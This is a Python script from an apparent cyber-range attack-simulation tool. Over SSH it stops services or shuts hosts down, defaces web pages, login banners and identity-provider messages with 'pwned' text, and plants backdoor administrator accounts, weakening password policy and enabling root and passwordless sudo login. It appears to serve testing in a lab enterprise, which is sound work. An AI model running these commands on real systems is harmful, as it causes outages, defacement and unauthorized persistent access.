#!/usr/bin/env python3

from shell_handler import ShellHandler
import paramiko
import socket
import time

# Verbose output flag
verbose = True


#
# impact_availability - Simulate an availability-related impact on a node.
#
# parameters:
#         node -- Dictionary containing details about the target node.
#
# returns: Dictionary with command, output, success, and any error.
#
def impact_availability(node: dict, enterprise: dict) -> dict:
    #    print(f"enterprise = {json.dumps({k: type(v).__name__ if isinstance(v, (dict, list, tuple, set)) else v for k, v in enterprise.items()}, indent=2)}")
    built = enterprise['enterprise_built']
    domain_leaders = built['setup']['setup_domains']['domain_leaders']

    print(f"[impact_availability] Impacting availability of node: {node['name']}")
    node_desc = node['enterprise_description']
    domain = node_desc['domain']
    domain_details = domain_leaders[domain]
    control_ip = node['addresses'][0]['addr']
    domain = node['domain']
    user = 'ubuntu' if 'linux' in node_desc['roles'] else 'administrator'
    password = None if 'linux' in node_desc['roles'] else domain_details['admin_pass']

    result = {
        "cmd": None,
        "stdout": None,
        "stderr": None,
        "exit_status": -1,
        "success": False,
        "error": None,
        "verified": False
    }

    cmd = ""
    expected_str = ""
    should_shutdown = False

    if 'sp' in node_desc['roles']:
        cmd = "sudo systemctl stop apache2 && sudo systemctl status apache2"
        expected_str = "Active: inactive"
    elif 'idp' in node_desc['roles']:
        cmd = "sudo systemctl stop jetty apache2 && sudo systemctl status jetty apache2 "
        expected_str = "Active: inactive"
    elif 'domain_controller' in node_desc['roles'] or 'domain_controller_leader' in node_desc['roles']:
        cmd = "Stop-Service -Name NTDS -force; Get-Service -Name NTDS"
        expected_str = "Stopped"
    elif 'fs' in node_desc['roles']:
        cmd = "sudo systemctl stop smbd && sudo systemctl status smbd"
        expected_str = "Active: inactive"
    elif 'linux' in node_desc['roles']:
        cmd = "sudo shutdown now"
        expected_str = ""
        should_shutdown = True
    elif 'windows' in node_desc['roles']:
        cmd = "Stop-Computer -Force"
        expected_str = ""
        should_shutdown = True
    else:
        msg = f"No supported role for availability impact on {node['name']}"
        print(f"[impact_availability] {msg}")
        result["error"] = msg
        return result

    result["cmd"] = cmd

    try:
        shell = ShellHandler(control_ip, user, password, verbose=verbose)
        if 'windows' in node_desc['roles']:
            stdout, stderr, exit_status = shell.execute_powershell(cmd)
        else:
            stdout, stderr, exit_status = shell.execute_cmd(cmd)

        result["stdout"] = stdout
        result["stderr"] = stderr
        result["exit_status"] = exit_status
        verified = expected_str in stdout or expected_str in stderr if expected_str else True
        result["verified"] = verified

        if should_shutdown:
            time.sleep(10)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            try:
                sock.connect((control_ip, 22))
                sock.close()
                result["error"] = "Node still responds to SSH after shutdown command."
                result["success"] = False
                result["verified"] = False
            except (socket.timeout, ConnectionRefusedError, OSError):
                result["success"] = exit_status == 0 and verified
            finally:
                sock.close()
        else:
            result["success"] = exit_status == 0 and verified

        if not result["success"] and result["error"] is None:
            result["error"] = "Command failed or output verification failed."

    except paramiko.SSHException as e:
        result["error"] = str(e)

    return result


#
# impact_availability - Simulate an availability-related impact on a node.
# (Unchanged, already uses correct credential extraction.)


#
# impact_integrity - Simulate an integrity-related impact on a node.
# This function applies different integrity modifications depending on the node's role:
# - SP: modifies secure/index.html and Moodle text across all domains
# - IDP: overrides login message in Shibboleth message properties
# - Linux (non-SP/IDP): adds a '[pwned]' prefix to the shell prompt via .bashrc
# - Other roles: reports that no integrity impact is defined
#
# parameters:
#         node -- Dictionary containing details about the target node.
#         enterprise -- Dictionary containing enterprise-wide configuration.
#
# returns: Dictionary with command, output, success, and any error.
#
def impact_integrity(node: dict, enterprise: dict) -> dict:
    print(f"[impact_integrity] Impacting integrity of node: {node['name']}")
    control_ip = node['addresses'][0]['addr']
    node_desc = node['enterprise_description']
    domain = node_desc['domain']
    domain_leaders = enterprise['enterprise_built']['setup']['setup_domains']['domain_leaders']
    domain_details = domain_leaders[domain]

    user = 'ubuntu' if 'linux' in node_desc['roles'] else 'administrator'
    password = None if 'linux' in node_desc['roles'] else domain_details['admin_pass']

    result = {
        "cmd": None,
        "stdout": None,
        "stderr": None,
        "exit_status": -1,
        "success": False,
        "error": None,
        "verified": False
    }

    try:
        shell = ShellHandler(control_ip, user, password, verbose=verbose)

        if 'sp' in node_desc['roles']:
            cmd = """
bash << 'OUTER'
cat << 'EOF' | sudo tee /opt/integrity-impact-sp.sh > /dev/null
#!/bin/bash
set -x
echo "[impact_integrity] modifying secure page and moodle"
for path in /var/www/html/service.*
do
  sudo sed -i 's|This is an example paragraph for a secure directory.*|<p>This site has been modified. You may have been pwned. [integrity tag]</p>|' "$path/secure/index.html"
  sudo -u www-data php "$path/moodle/admin/tool/replace/cli/replace.php" \
          --search='Moody' --replace='Pwned' --non-interactive
done
echo "[impact_integrity] complete"
EOF
sudo chmod +x /opt/integrity-impact-sp.sh
sudo /opt/integrity-impact-sp.sh | sudo tee -a /var/log/integrity-impact-sp.log
OUTER
            """
            verify_tag = "[impact_integrity] complete"

        elif 'idp' in node_desc['roles']:
            cmd = """
bash << 'OUTER'
cat << 'EOF' | sudo tee /opt/integrity-impact-idp.sh > /dev/null
#!/bin/bash
set -x
echo "[impact_integrity] modifying Shibboleth IDP message properties"
prop_file="/opt/shibboleth-idp/messages/messages.properties"
if ! grep -q '^idp.login.forgotPassword=' "$prop_file"; then
  echo "idp.login.forgotPassword=You've been pwned" | sudo tee -a "$prop_file"
fi
sudo rm -rf /opt/shibboleth-idp/data/tmp/*
sudo systemctl restart jetty apache2
echo "[impact_integrity] complete"
EOF
sudo chmod +x /opt/integrity-impact-idp.sh
sudo /opt/integrity-impact-idp.sh | sudo tee -a /var/log/integrity-impact-idp.log
OUTER
            """
            verify_tag = "[impact_integrity] complete"

        elif 'linux' in node_desc['roles']:
            cmd = """
bash << 'OUTER'
set -x
cat << 'MIDDLE' | sudo tee /opt/integrity-impact-linux.sh > /dev/null
#!/bin/sh

set -x

rm -f /etc/update-motd.d/*
cat << 'INNER' | sudo tee /etc/update-motd.d/99-pwned > /dev/null
#!/bin/bash


# Display a warning motd on login
echo ""
echo -e "\033[1;31m██████╗ ██╗    ██╗███╗    ██╗██████╗ \033[0m"
echo -e "\033[1;31m██╔══██╗██║    ██║████╗   ██║██╔══██╗\033[0m"
echo -e "\033[1;31m██████╔╝██║ █╗ ██║██╔██╗  ██║██║  ██║\033[0m"
echo -e "\033[1;31m██╔═══╝ ██║███╗██║██║╚██╗ ██║██║  ██║\033[0m"
echo -e "\033[1;31m██║     ╚███╔███╔╝██║ ╚█████║██████╝ \033[0m"
echo -e "\033[1;31m╚═╝      ╚══╝╚══╝ ╚═╝  ╚════╝╚════╝  \033[0m"
echo ""
echo ""
echo "You've been pwnd."
INNER
sudo chmod +x /etc/update-motd.d/99-pwned
sudo rm -f /etc/motd
sudo ln -s /run/motd.dynamic /etc/motd
run-parts /etc/update-motd.d > /run/motd.dynamic

MIDDLE
sudo chmod +x /opt/integrity-impact-linux.sh
sudo /opt/integrity-impact-linux.sh 2>&1 | sudo tee -a /var/log/integrity-impact-linux.log
OUTER
            """
            verify_tag = "[pwned prompt injected]"
        elif 'windows' in node_desc['roles']:
            cmd = (
                "$bannerPath = 'C:\\ProgramData\\ssh\\pwnd-banner.txt' ;  "
                "$bannerContent = '########################################' + \"`n\" + "
                "                 '#                                      #' + \"`n\" + "
                "                 '#         YOU HAVE BEEN PWND           #' + \"`n\" + "
                "                 '#                                      #' + \"`n\" + "
                "                 '########################################' + \"`n\" ; "
                "Set-Content -Path $bannerPath -Value $bannerContent -Force; "
                "$configPath = 'C:/ProgramData/ssh/sshd_config' ; "
                "$config = Get-Content $configPath ; "
                "$config = $config | Where-Object { $_ -notmatch '^[\\\\]*Banner ' }; "
                "$config += 'Banner ' + $bannerPath; "
                "Set-Content -Path $configPath -Value $config -Force; "
                "Restart-Service sshd; "
                "echo 'finished pwning sshd'"
            )
            verify_tag = "finished pwning sshd"

        else:
            result["error"] = f"No integrity impact defined for node roles: {node['roles']}"
            return result

        if 'windows' in node_desc['roles']:
            stdout, stderr, exit_status = shell.execute_powershell(cmd, verbose=verbose)
        else:
            stdout, stderr, exit_status = shell.execute_cmd(cmd, verbose=verbose)

        if verbose:
            print(f"stdout={stdout}")
            print(f"stderr={stderr}")
            print(f"exit_status={stderr}")
        result["cmd"] = cmd
        result["stdout"] = stdout
        result["stderr"] = stderr
        result["exit_status"] = exit_status
        result["verified"] = verify_tag.lower() in str(stdout + stderr).lower()
        result["success"] = exit_status == 0 and result["verified"]

        if not result["success"]:
            result["error"] = "One or more commands failed or verification tag not found."

    except paramiko.SSHException as e:
        result["error"] = str(e)

    return result


#
# impact_availability - Simulate an availability-related impact on a node.
# (Unchanged, already uses correct credential extraction.)


#
# impact_confidentiality - Simulate a confidentiality-related impact on a node.
# This enables root login via SSH and sets the root password to 'pwned' on Linux,
# or creates a backdoor administrator account on Windows.
#
# parameters:
#         node -- Dictionary containing details about the target node.
#         enterprise -- Dictionary containing enterprise-wide configuration.
#
# returns: Dictionary with command, output, success, and any error.
#
def impact_confidentiality(node: dict, enterprise: dict) -> dict:
    print(f"[impact_confidentiality] Impacting confidentiality of node: {node['name']}")
    control_ip = node['addresses'][0]['addr']
    node_desc = node['enterprise_description']
    domain = node_desc['domain']
    domain_leaders = enterprise['enterprise_built']['setup']['setup_domains']['domain_leaders']
    domain_details = domain_leaders[domain]

    user = 'ubuntu' if 'linux' in node_desc['roles'] else 'administrator'
    password = None if 'linux' in node_desc['roles'] else domain_details['admin_pass']

    result = {
        "cmd": None,
        "stdout": None,
        "stderr": None,
        "exit_status": -1,
        "success": False,
        "error": None,
        "verified": False
    }

    try:
        shell = ShellHandler(control_ip, user, password, verbose=verbose)

        if 'windows' in node_desc['roles']:
            cmd = (
                "secedit /export /cfg secconfig.cfg;"
                "(Get-Content secconfig.cfg) -replace 'PasswordComplexity\s*=\s*1', 'PasswordComplexity = 0' |"
                "    Set-Content secconfig-mod.cfg;"
                "secedit /configure /db secedit.sdb /cfg secconfig-mod.cfg /areas SECURITYPOLICY;"
                "Remove-Item secconfig.cfg, secconfig-mod.cfg, secedit.sdb;"
                "net accounts /minpwlen:4;"
                "$username = 'impactadmin'; "
                "$password = ConvertTo-SecureString 'pwned' -AsPlainText -Force; "
                "if (-not (Get-LocalUser -Name $username -ErrorAction SilentlyContinue)) { "
                "    New-LocalUser -Name $username -Password $password -FullName 'Impact Admin' -Description 'Backdoor admin account' "
                "}; "
                "net localgroup Administrators impactadmin /add ; "
                "Write-Output '[confidentiality access enabled]' "
            )
            verify_tag = "[confidentiality access enabled]"
            stdout, stderr, exit_status = shell.execute_powershell(cmd)
            result["verified"] = exit_status == 0 and verify_tag.lower() in str(stdout + stderr).lower()

        elif 'linux' in node_desc['roles']:
            cmd = """
bash << 'OUTER'
cat << 'EOF' | sudo tee /opt/confidentiality-impact-linux.sh > /dev/null
#!/bin/bash
set -x
echo "[impact_confidentiality] creating impactroot user and enabling SSH access"
if ! id impactroot &>/dev/null; then
    sudo useradd -m impactroot
fi
echo 'impactroot:pwned' | sudo chpasswd --crypt-method=SHA512
sudo usermod -aG sudo impactroot
sudo sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
echo 'impactroot ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/impactroot
sudo chmod 440 /etc/sudoers.d/impactroot
sudo systemctl restart ssh
echo "[confidentiality access enabled]"
EOF
sudo chmod +x /opt/confidentiality-impact-linux.sh
sudo /opt/confidentiality-impact-linux.sh | sudo tee -a /var/log/confidentiality-impact-linux.log
OUTER
"""
            verify_tag = "[confidentiality access enabled]"
            stdout, stderr, exit_status = shell.execute_cmd(cmd)
            result["verified"] = exit_status == 0 and verify_tag.lower() in str(stdout + stderr).lower()

    except paramiko.SSHException as e:
        result["error"] = str(e)
        return result

    if not result['verified']:
        return result

    try:
        if 'windwos' in node_desc['roles']:
            impact_shell = ShellHandler(control_ip, 'impactadmin', 'pwned', verbose=verbose)
            cmd = (
                "if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { Write-Output 'impactadmin has administrative privileges.' } else { Write-Output 'impactadmin does NOT have administrative privileges.' }"
            )
            check_out, check_err, check_code = impact_shell.execute_powershell(cmd)
            result["verified"] = check_code == 0 and "administrative privileges" in check_out

        elif 'linux' in node_desc['roles']:
            impact_shell = ShellHandler(control_ip, 'impactroot', 'pwned', verbose=verbose)
            check_out, check_err, check_code = impact_shell.execute_cmd("sudo cat /etc/passwd")
            result["verified"] = check_code == 0 and str(check_out).strip() != ""

    except paramiko.SSHException as e:
        result["error"] = str(e)
        return result

    result["cmd"] = cmd
    result["stdout"] = stdout
    result["stderr"] = stderr
    result["exit_status"] = exit_status
    result["success"] = exit_status == 0 and result["verified"]

    if not result["success"] and result["error"] is None:
        result["error"] = "One or more commands failed or verification tag not found."

    return result
